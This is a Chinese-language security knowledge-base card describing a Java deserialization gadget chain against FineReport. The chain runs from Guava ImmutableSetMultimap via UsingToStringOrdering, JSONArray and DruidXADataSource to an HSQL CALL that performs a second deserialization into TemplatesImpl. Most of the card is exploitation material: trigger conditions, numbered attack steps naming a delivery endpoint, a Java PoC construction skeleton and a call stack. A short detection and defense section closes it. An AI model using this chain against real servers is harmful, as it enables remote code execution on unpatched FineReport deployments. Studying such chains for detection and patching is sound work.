---
id: web-java-deserialization-immutablesetmultimap-usingtostring-jsonarray-hsql
title: ImmutableSetMultimap 经 UsingToStringOrdering 触发 JSONArray getter，再走 DruidXADataSource + HSQL 二次反序列化
type: scenario
domain: web
path: web/java/deserialization
technique: guava-immutablesetmultimap-tostring-jdbc-hsql-secondary
tags:
- java
- deserialization
- guava
- immutablesetmultimap
- usingtostring
- jsonarray
- druid
- hsqldb
- jdbc
- templatesimpl
- finereport
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: 帆软 FineReport V10 全版本；V11 ≤ 11.0.32（原文 2025.3.31 修复）
verification:
  verified_by: verifier-V40
  verified_at: '2026-11-05T06:25:45+08:00'
  notes: 已对照原文与图19-40核对：ImmutableSetMultimap.readObject读取valueComparator→valuesBuilder→ImmutableSortedSet.Builder.build→sortAndDedup→Arrays.sort→TimSort.countRunAndMakeAscending→UsingToStringOrdering.compare→JSONArray.toString→EmbedJson.encode→Jackson writeValueAsString→DruidXADataSource.getXAConnection→HSQL CALL静态deserialize→第二段反序列化；原文成功触发toString（toString123321）并给出完整构造代码与调用栈，第二段TemplatesImpl未展示端到端执行，置信medium保留。已按原文补设affected_versions（V10全版本；V11≤11.0.32修复）。PoC未执行。
url: /docs/web/java/deserialization/web-java-deserialization-immutablesetmultimap-usingtostring-jsonarray-hsql/
draft: false
kb_aliases:
- ImmutableSetMultimap 反序列化链
- UsingToStringOrdering compare toString
- JSONArray toString getter 链
- DruidXADataSource getXAConnection
- HSQL CALL 静态方法二次反序列化
- 帆软 ImmutableSetMultimap 链
---

## 一句话结论

当目标 classpath 同时存在 Guava、帆软 JSONArray、Druid 与 HSQL 时，一条反序列化链可从 `ImmutableSetMultimap.readObject` 走到 `UsingToStringOrdering.compare → toString`，用 `JSONArray.toString` 的 Jackson 序列化触发 `DruidXADataSource.getXAConnection` 建立 JDBC 连接，再借 HSQL 的 `CALL` 执行静态方法完成二次反序列化，最终落到 TemplatesImpl 等 RCE sink。

## 原理

- `ImmutableSetMultimap.readObject` 会从流中读取 `valueComparator`，并用 `valuesBuilder(valueComparator)` 创建 value 集合。`valueComparator != null` 时返回 `ImmutableSortedSet.Builder`，其 `build()` 调用 `sortAndDedup()`，进而 `Arrays.sort(elements, 0, n, comparator)`。
- 当元素个数 ≥2 时进入 TimSort 的 `countRunAndMakeAscending`，调用 `comparator.compare(a[runHi++], a[lo])`。若 comparator 是 Guava 的 `UsingToStringOrdering`，其 `compare` 直接 `left.toString().compareTo(right.toString())`，从而触发任意对象的 `toString()`。
- 让被比较对象的 `toString()` 是 `com.fr.json.JSONArray#toString`：它调用 `encode()` → `EmbedJson.encode()` → Jackson `ObjectMapper.writeValueAsString()`。Jackson 序列化 POJO 时会调用 getter，于是触发 `DruidXADataSource#getXAConnection()`。
- `getXAConnection()` 会 `getConnection()` 建立 JDBC 连接。把 `driverClassName` 设为 `com.fr.third.org.hsqldb.jdbcDriver`，`url` 设为内存库，`validationQuery` 设为 `CALL "org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize"(X'<hex>')`。HSQL 在连接/校验阶段执行 `CALL`，调用任意 public static 方法；这里调用 ehcache 的 `deserialize` 对十六进制字节做第二次 Java 反序列化。
- 第二段 payload 可用 TemplatesImpl：用 Spring AOP 的 `JdkDynamicAopProxy` 代理 `Templates` 接口，`AdvisedSupport` 的 target 指向恶意 `TemplatesImpl`；再放进 `BadAttributeValueExpException` 或 JSONArray 中。这样避开外层黑名单对 `SignedObject` 等类的拦截。
- 关键工程细节：`ImmutableSetMultimap` 正常构建时 comparator 是自然序；攻击者需通过反射/Unsafe 把序列化对象内部的 `emptySet` 字段替换为带有 `UsingToStringOrdering` 的 `RegularImmutableSortedSet`，并保证同一个 key 至少 put 两个 value，否则 TimSort 不会进入 compare。
- 整条链的价值在于“把 toString 触发点桥接到 JDBC”，在无法直接使用 TemplatesImpl/SignedObject 的场景下提供替代路径。

## 触发条件

- 存在反序列化入口，且目标 classpath 含：Guava（`ImmutableSetMultimap`）、帆软 `com.fr.json.JSONArray`/`EmbedJson`、Druid（`DruidXADataSource`）、HSQLDB 驱动、以及可用的第二段 sink（TemplatesImpl/Spring AOP 等）。
- 黑名单未拦截上述类；该链在帆软 V11 直到 11.0.32 才修复，V10 全版本可用。
- 运行环境为 JDK 8（原文 POC 使用 JDK 1.8；更高版本需调整 sink，如外部 Xalan TemplatesImpl）。
- 能构造/发送序列化数据（如帆软 `/remote/design/channel`）。

## 利用步骤

1. 生成第二段 TemplatesImpl 序列化数据（`TemplatesGen` + `JdkDynamicAopProxy` 代理 `Templates` 接口），转十六进制字符串。
2. 构造 `DruidXADataSource`：driver 为 `com.fr.third.org.hsqldb.jdbcDriver`，url 为 `jdbc:hsqldb:mem:test`，`validationQuery` 为 `CALL "org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize"(X'<hex>')`；把无法序列化的 `transactionHistogram`、`initedLatch` 置 null。
3. 用 `ArrayList` 包住 Druid 数据源，再放入 `com.fr.json.JSONArray`；JSONArray 作为 `ImmutableSetMultimap` 的一个 value。
4. 构建 `ImmutableSetMultimap`，对同一 key put 两个及以上 value（保证 TimSort 比较）；用 Unsafe 获取 `RegularImmutableSortedSet`，把 `comparator` 设为 `Ordering.usingToString()`，再替换 multimap 的 `emptySet` 字段。
5. 序列化 multimap，按入口要求做 Gzip 封装并发送。
6. 反序列化触发 `ImmutableSetMultimap.readObject → build → Arrays.sort → UsingToStringOrdering.compare → JSONArray.toString → Jackson getter → DruidXADataSource.getXAConnection → HSQL CALL → 第二段反序列化 → TemplatesImpl`。

## PoC

构造骨架（依赖原文的 `ReflectTools`/`UnsafeTools`/`TemplatesGen` 辅助类；完整可运行代码见原文仓库）：

```java
String serData = getSerData(); // 第二段 TemplatesImpl 十六进制

DruidDataSource ds = new DruidXADataSource();
ds.setDriverClassName("com.fr.third.org.hsqldb.jdbcDriver");
ds.setUrl("jdbc:hsqldb:mem:test");
ds.setUsername("any"); ds.setPassword("");
ds.setInitialSize(1);
ds.setValidationQuery(
    "CALL \"org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize\"(X'" + serData + "');");
ds.setLogWriter(null); ds.setStatLogger(null);
ReflectTools.setFieldValue(ds, "transactionHistogram", null);
ReflectTools.setFieldValue(ds, "initedLatch", null);

ArrayList<Object> list = new ArrayList<>(); list.add(ds);
JSONArray jsonArray = new JSONArray(); jsonArray.add(list);

ImmutableSetMultimap<String, Object> multimap = ImmutableSetMultimap.<String, Object>builder()
    .put("key", jsonArray)
    .put("key", "value2")
    .build();

Ordering<Object> comparator = Ordering.usingToString();
Object sortedSet = UnsafeTools.getObjectByUnsafe(
    Class.forName("com.fr.third.guava.collect.RegularImmutableSortedSet"));
ReflectTools.setFieldValue(sortedSet, "comparator", comparator);
ReflectTools.setFieldValue(multimap, "emptySet", sortedSet);
```

原文在该骨架下成功触发 `toString`（打印 `toString123321`），并给出完整调用栈：

```text
ImmutableSetMultimap.readObject
→ ImmutableSortedSet.Builder.build
→ ImmutableSortedSet.Builder.sortAndDedup
→ Arrays.sort → TimSort.sort → TimSort.countRunAndMakeAscending
→ UsingToStringOrdering.compare
→ JSONArray.toString → EmbedJson.encode → Jackson writeValueAsString
→ DruidXADataSource.getXAConnection
→ HSQL CALL 静态 deserialize → 第二段反序列化
```

## 变体与关联

- 同类触发点替换：`HashSet`/`TreeMap`/`PriorityQueue` 等依赖 `compare/compareTo` 的集合也可桥接 `UsingToStringOrdering`，不限于 `ImmutableSetMultimap`。
- JSONArray 的 getter 触发也可换其它能发起网络/JDBC/文件操作的 getter；DruidXADataSource 只是其中一种。
- 第二段 sink 可换 `SignedObject`（若未被黑名单）、JNDI、其它 TemplatesImpl 代理链。
- 与 [[web-java-deser-stringvaluetransformer-css-jsonarray-templatesimpl]] 都使用 JSONArray/Jackson getter 桥接，但本卡入口是 Guava `ImmutableSetMultimap` + `UsingToStringOrdering`，并增加了 HSQL 二次反序列化环节。
- 在帆软场景中的投递入口见 [[web-java-deserialization-finereport-channel-gzip-safeinvocation]]；其他链（TreeBag、TextAndMnemonicHashMap）是其变体，修复版本不同。

## 检测与防御

- 升级帆软到 11.0.32 之后，并将 Guava `ImmutableSetMultimap`、`UsingToStringOrdering`、`JSONArray`、`DruidXADataSource` 等加入反序列化黑名单。
- 启用 JEP 290 全局过滤器，按“允许类白名单”而非黑名单拦截；禁止对不可信输入做原生反序列化。
- 限制 JDBC 连接能力：应用不应能加载任意 JDBC 驱动；对 `validationQuery`/`init` 等参数做白名单，禁用 HSQL `CALL` 静态方法。
- 运行时检测：反序列化类名中出现 `ImmutableSetMultimap`/`UsingToStringOrdering`/`DruidXADataSource`；应用进程发起 `jdbc:hsqldb:mem` 连接；`CALL` 中引用 `SerializationHelper.deserialize`；子进程/异常类加载行为。
- 审计：搜索 `ImmutableSetMultimap.readObject` 的反序列化入口、Jackson `writeValueAsString` 触发的 getter，以及 Druid 数据源的可序列化字段。
